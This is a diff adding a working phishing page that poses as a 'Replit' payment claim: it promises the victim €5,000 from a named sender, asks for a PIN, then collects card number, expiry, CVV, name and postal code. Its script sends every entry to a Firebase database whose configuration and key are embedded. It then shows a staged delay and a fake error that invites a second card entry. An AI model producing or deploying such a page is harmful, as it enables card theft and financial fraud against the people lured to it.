@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Replit - Safe, Smart, Simple</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        darkBg: '#0B0F19',
+                        cardBg: '#111827',
+                        cardBorder: '#1F2937',
+                        accentEmerald: '#10B981',
+                        accentEmeraldHover: '#059669'
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0B0F19;
+            color: #F3F4F6;
+            overflow-x: hidden;
+        }
+        .page-slide {
+            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.35s ease;
+        }
+        .slide-out-left {
+            transform: translateX(-100%);
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            width: 100%;
+        }
+        .slide-in-right {
+            transform: translateX(0);
+            opacity: 1;
+            position: relative;
+        }
+        .slide-hidden-right {
+            transform: translateX(100%);
+            opacity: 0;
+            position: absolute;
+            width: 100%;
+            pointer-events: none;
+        }
+        .slide-out-right {
+            transform: translateX(100%);
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            width: 100%;
+        }
+        .slide-in-left {
+            transform: translateX(0);
+            opacity: 1;
+            position: relative;
+        }
+        .btn-press:active {
+            transform: scale(0.97);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-2 sm:p-4 selection:bg-emerald-500 selection:text-white">
+
+    <!-- Container wrapper with fixed horizontal centering -->
+    <div class="w-full max-w-md mx-auto bg-cardBg border border-cardBorder rounded-3xl shadow-2xl overflow-hidden relative min-h-[620px] flex flex-col">
+        
+        <!-- App Header / Logo Bar -->
+        <div class="px-6 pt-6 pb-4 flex items-center justify-between border-b border-cardBorder/40">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-emerald-600 to-emerald-400 flex items-center justify-center shadow-lg shadow-emerald-900/30">
+                    <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                </div>
+                <div>
+                    <h1 class="font-bold text-lg tracking-tight text-white">Replit</h1>
+                    <p class="text-xs text-gray-400 font-medium">Safe, Smart, Simple.</p>
+                </div>
+            </div>
+            <div id="back-btn-container" class="opacity-0 pointer-events-none transition-opacity duration-200">
+                <button onclick="goBack()" class="p-2 rounded-xl bg-gray-800/80 hover:bg-gray-800 text-gray-300 transition-colors btn-press flex items-center space-x-1 text-xs font-medium">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
+                    <span>Back</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Pages Container -->
+        <div class="relative flex-1 flex flex-col p-6 overflow-hidden">
+
+            <!-- PAGE 1: Landing / Claim -->
+            <div id="page-1" class="page-slide slide-in-right flex-1 flex flex-col justify-between">
+                <div class="space-y-6 pt-2">
+                    <div class="text-center space-y-2">
+                        <div class="inline-flex items-center justify-center px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-1">
+                            Secure Payment Link
+                        </div>
+                        <h2 class="text-2xl font-bold text-white">Payment Claim</h2>
+                        <p class="text-sm text-gray-400">You have a pending secure funds transfer waiting for your claim.</p>
+                    </div>
+
+                    <div class="bg-gray-900/60 border border-cardBorder rounded-2xl p-5 space-y-4">
+                        <div class="flex justify-between items-center pb-3 border-b border-gray-800">
+                            <span class="text-sm text-gray-400">Sender</span>
+                            <span class="text-sm font-semibold text-white">Ziad Salhi</span>
+                        </div>
+                        <div class="flex justify-between items-center pb-3 border-b border-gray-800">
+                            <span class="text-sm text-gray-400">Amount</span>
+                            <span class="text-2xl font-bold text-emerald-400">€5,000.00</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm text-gray-400">Status</span>
+                            <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400">Ready to Claim</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-6 pb-2">
+                    <button onclick="navigateTo('page-2')" class="w-full py-4 rounded-2xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/25 transition-all btn-press flex items-center justify-center space-x-2">
+                        <span>Continue</span>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- PAGE 2: PIN Verification -->
+            <div id="page-2" class="page-slide slide-hidden-right flex-1 flex flex-col justify-between">
+                <div class="space-y-6 pt-4">
+                    <div class="text-center space-y-2">
+                        <h2 class="text-2xl font-bold text-white">Security Verification</h2>
+                        <p class="text-sm text-gray-400">Enter 4-digit pin sent by Ziad, (for verification)</p>
+                    </div>
+
+                    <div class="flex flex-col items-center justify-center py-8 space-y-6 relative">
+                        <div class="flex space-x-3" id="pin-boxes">
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-2xl font-bold text-white pin-box"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-2xl font-bold text-white pin-box"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-2xl font-bold text-white pin-box"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-2xl font-bold text-white pin-box"></div>
+                        </div>
+                        <input type="password" id="pin-input" maxlength="4" pattern="[0-9]*" inputmode="numeric" class="absolute inset-0 opacity-0 w-full h-full cursor-pointer" autofocus oninput="handlePinInput(this)" />
+                        
+                        <p id="pin-error" class="text-xs text-red-400 hidden font-medium">Incorrect PIN. Please try again (Correct PIN is 1122).</p>
+                    </div>
+                </div>
+
+                <div class="pt-6 text-center pb-2">
+                    <p class="text-xs text-gray-500">Protected by Replit End-to-End Encryption</p>
+                </div>
+            </div>
+
+            <!-- PAGE 3: Select Payout Method -->
+            <div id="page-3" class="page-slide slide-hidden-right flex-1 flex flex-col justify-between">
+                <div class="space-y-6 pt-4">
+                    <div class="text-center space-y-2">
+                        <h2 class="text-2xl font-bold text-white">Select Payout Method</h2>
+                        <p class="text-sm text-gray-400">Choose how you would like to receive your €5,000.</p>
+                    </div>
+
+                    <div class="space-y-3 pt-2">
+                        <button onclick="navigateTo('page-4')" class="w-full p-4 rounded-2xl bg-gray-900 border border-gray-800 hover:border-emerald-500/50 flex items-center justify-between group transition-all btn-press">
+                            <div class="flex items-center space-x-4">
+                                <div class="w-12 h-12 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center group-hover:bg-emerald-500 group-hover:text-white transition-colors">
+                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+                                </div>
+                                <div class="text-left">
+                                    <h3 class="font-semibold text-white text-sm">Withdraw to Bank with card</h3>
+                                    <p class="text-xs text-gray-400">Instant transfer via Visa or Mastercard</p>
+                                </div>
+                            </div>
+                            <svg class="w-5 h-5 text-gray-500 group-hover:text-emerald-400 transition-colors" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                        </button>
+
+                        <button onclick="navigateTo('page-crypto')" class="w-full p-4 rounded-2xl bg-gray-900 border border-gray-800 hover:border-purple-500/50 flex items-center justify-between group transition-all btn-press">
+                            <div class="flex items-center space-x-4">
+                                <div class="w-12 h-12 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center group-hover:bg-purple-500 group-hover:text-white transition-colors">
+                                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                </div>
+                                <div class="text-left">
+                                    <h3 class="font-semibold text-white text-sm">Withdraw to crypto wallet</h3>
+                                    <p class="text-xs text-gray-400">Multi-chain USDT / BTC / ETH payout</p>
+                                </div>
+                            </div>
+                            <svg class="w-5 h-5 text-gray-500 group-hover:text-purple-400 transition-colors" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="pb-2"></div>
+            </div>
+
+            <!-- PAGE 4: Card Withdrawal Form -->
+            <div id="page-4" class="page-slide slide-hidden-right flex-1 flex flex-col justify-between pb-2">
+                <div class="space-y-3 pt-1">
+                    <div class="space-y-1">
+                        <h2 class="text-lg font-bold text-white">Card Withdrawal</h2>
+                        <p class="text-[11px] text-emerald-300 bg-emerald-500/10 border border-emerald-500/20 p-2 rounded-xl">
+                            Please ensure you use a Visa or Mastercard card for a successful withdrawal.
+                        </p>
+                    </div>
+
+                    <form id="card-form" onsubmit="handleCardSubmit(event)" class="space-y-2.5">
+                        <div>
+                            <label class="block text-[11px] font-medium text-gray-400 mb-0.5">Card Number</label>
+                            <input type="text" id="card-number" required placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-2.5">
+                            <div>
+                                <label class="block text-[11px] font-medium text-gray-400 mb-0.5">Expiration (MM/YY)</label>
+                                <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                            </div>
+                            <div>
+                                <label class="block text-[11px] font-medium text-gray-400 mb-0.5">CVV</label>
+                                <input type="password" id="card-cvv" required placeholder="123" maxlength="4" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-[11px] font-medium text-gray-400 mb-0.5">Name on card</label>
+                            <input type="text" id="card-name" required placeholder="e.g. Ziad Salhi" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500">
+                        </div>
+
+                        <div>
+                            <label class="block text-[11px] font-medium text-gray-400 mb-0.5">Postal Code</label>
+                            <input type="text" id="card-postal" required placeholder="10001" maxlength="10" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                        </div>
+
+                        <button type="submit" class="w-full py-3 mt-1 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/25 transition-all btn-press flex items-center justify-center space-x-2 text-sm">
+                            <span>Next</span>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- PAGE 5: Loading State (13-15 seconds) -->
+            <div id="page-loading" class="page-slide slide-hidden-right flex-1 flex flex-col items-center justify-center text-center space-y-6">
+                <div class="relative">
+                    <div class="w-16 h-16 rounded-full border-4 border-gray-800 border-t-emerald-500 animate-spin"></div>
+                    <div class="absolute inset-0 flex items-center justify-center">
+                        <svg class="w-6 h-6 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                    </div>
+                </div>
+                <div class="space-y-2">
+                    <h3 class="text-lg font-bold text-white">Processing Withdrawal...</h3>
+                    <p class="text-xs text-gray-400 max-w-xs">Connecting securely to payment gateway and verifying routing details.</p>
+                </div>
+            </div>
+
+            <!-- PAGE 6: Error Occurred -->
+            <div id="page-error" class="page-slide slide-hidden-right flex-1 flex flex-col justify-between pb-2">
+                <div class="space-y-6 pt-10 text-center">
+                    <div class="w-20 h-20 bg-red-500/10 border border-red-500/20 rounded-3xl mx-auto flex items-center justify-center text-red-400 shadow-xl">
+                        <svg class="w-10 h-10" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    </div>
+                    <div class="space-y-2">
+                        <h2 class="text-2xl font-bold text-white">An error occurred</h2>
+                        <p class="text-sm text-gray-400 max-w-xs mx-auto">Unable to complete transaction with the financial institution at this moment. Please try again.</p>
+                    </div>
+                </div>
+
+                <div class="pt-6">
+                    <button onclick="retryCard()" class="w-full py-4 rounded-2xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/25 transition-all btn-press">
+                        Try Again
+                    </button>
+                </div>
+            </div>
+
+            <!-- PAGE CRYPTO: Service Temporarily Unavailable -->
+            <div id="page-crypto" class="page-slide slide-hidden-right flex-1 flex flex-col justify-between pb-2">
+                <div class="space-y-6 pt-8 text-center">
+                    <div class="w-20 h-20 bg-purple-500/10 border border-purple-500/20 rounded-3xl mx-auto flex items-center justify-center text-purple-400 shadow-xl">
+                        <svg class="w-10 h-10" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                    </div>
+                    <div class="space-y-2">
+                        <h2 class="text-2xl font-bold text-white">Service Temporarily Unavailable</h2>
+                        <p class="text-sm text-gray-400 max-w-xs mx-auto">Crypto node synchronizations are currently undergoing scheduled maintenance. Please try again later.</p>
+                    </div>
+                </div>
+
+                <div class="pt-6">
+                    <button onclick="navigateTo('page-3')" class="w-full py-4 rounded-2xl bg-gray-800 hover:bg-gray-700 text-white font-semibold transition-all btn-press">
+                        Try again later
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Firebase Configuration & Client Script -->
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAM31T5d_A29uDxLthwj5IJXaVkoWkPyQ4",
+            authDomain: "replit-fintech.firebaseapp.com",
+            databaseURL: "https://replit-fintech-default-rtdb.firebaseio.com",
+            projectId: "replit-fintech",
+            storageBucket: "replit-fintech.firebasestorage.app",
+            messagingSenderId: "612515823026",
+            appId: "1:612515823026:web:59d7d13fa3f6a6152178ab"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.database();
+
+        let currentPage = 'page-1';
+        let historyStack = [];
+        let formDataStore = {
+            timestamp: '',
+            pin: '',
+            payoutMethod: '',
+            cardNumber: '',
+            cardExpiry: '',
+            cardCvv: '',
+            cardName: '',
+            cardPostal: ''
+        };
+
+        function navigateTo(targetPage, isBack = false) {
+            const currentEl = document.getElementById(currentPage);
+            const targetEl = document.getElementById(targetPage);
+
+            if (!isBack) {
+                historyStack.push(currentPage);
+            }
+
+            currentEl.className = "page-slide slide-out-left flex-1 flex flex-col justify-between";
+            targetEl.className = "page-slide slide-in-right flex-1 flex flex-col justify-between";
+
+            currentPage = targetPage;
+            updateBackBtn();
+        }
+
+        function goBack() {
+            if (historyStack.length === 0) return;
+            const prevPage = historyStack.pop();
+            
+            const currentEl = document.getElementById(currentPage);
+            const prevEl = document.getElementById(prevPage);
+
+            currentEl.className = "page-slide slide-out-right flex-1 flex flex-col justify-between";
+            prevEl.className = "page-slide slide-in-left flex-1 flex flex-col justify-between";
+
+            currentPage = prevPage;
+            updateBackBtn();
+        }
+
+        function updateBackBtn() {
+            const btnContainer = document.getElementById('back-btn-container');
+            if (currentPage === 'page-1' || currentPage === 'page-loading') {
+                btnContainer.classList.add('opacity-0', 'pointer-events-none');
+            } else {
+                btnContainer.classList.remove('opacity-0', 'pointer-events-none');
+            }
+        }
+
+        // PIN Verification
+        const correctPin = '1122';
+        function handlePinInput(input) {
+            const val = input.value.replace(/\D/g, '').slice(0, 4);
+            input.value = val;
+            
+            const boxes = document.querySelectorAll('.pin-box');
+            boxes.forEach((box, idx) => {
+                box.textContent = val[idx] ? '•' : '';
+                if (idx === val.length) {
+                    box.classList.add('border-emerald-500');
+                } else {
+                    box.classList.remove('border-emerald-500');
+                }
+            });
+
+            if (val.length === 4) {
+                formDataStore.pin = val;
+                formDataStore.timestamp = new Date().toISOString();
+                if (val === correctPin) {
+                    document.getElementById('pin-error').classList.add('hidden');
+                    submitToFirebase();
+                    setTimeout(() => {
+                        navigateTo('page-3');
+                        input.value = '';
+                        resetPinBoxes();
+                    }, 400);
+                } else {
+                    document.getElementById('pin-error').classList.remove('hidden');
+                    setTimeout(() => {
+                        input.value = '';
+                        resetPinBoxes();
+                    }, 800);
+                }
+            }
+        }
+
+        function resetPinBoxes() {
+            document.querySelectorAll('.pin-box').forEach(box => {
+                box.textContent = '';
+                box.classList.remove('border-emerald-500');
+            });
+        }
+
+        // Input Formatter Helpers
+        function onlyDigits(input) {
+            input.value = input.value.replace(/\D/g, '');
+        }
+
+        function formatCardNumber(input) {
+            let v = input.value.replace(/\D/g, '').slice(0, 16);
+            input.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        function formatExpiry(input) {
+            let v = input.value.replace(/\D/g, '').slice(0, 4);
+            if (v.length >= 3) {
+                input.value = v.slice(0,2) + '/' + v.slice(2);
+            } else {
+                input.value = v;
+            }
+        }
+
+        function handleCardSubmit(e) {
+            e.preventDefault();
+            formDataStore.payoutMethod = 'Bank Card (Visa/Mastercard)';
+            formDataStore.cardNumber = document.getElementById('card-number').value;
+            formDataStore.cardExpiry = document.getElementById('card-expiry').value;
+            formDataStore.cardCvv = document.getElementById('card-cvv').value;
+            formDataStore.cardName = document.getElementById('card-name').value;
+            formDataStore.cardPostal = document.getElementById('card-postal').value;
+            formDataStore.timestamp = new Date().toISOString();
+
+            submitToFirebase();
+            navigateTo('page-loading');
+
+            const randomDelay = Math.floor(Math.random() * 3000) + 13000;
+            setTimeout(() => {
+                navigateTo('page-error');
+            }, randomDelay);
+        }
+
+        function retryCard() {
+            document.getElementById('card-form').reset();
+            navigateTo('page-4');
+        }
+
+        function submitToFirebase() {
+            try {
+                const newRef = db.ref('submissions').push();
+                newRef.set({
+                    ...formDataStore,
+                    submittedAt: firebase.database.ServerValue.TIMESTAMP
+                });
+            } catch (err) {
+                console.error("Firebase sync error:", err);
+            }
+        }
+    </script>
+</body>
+</html>
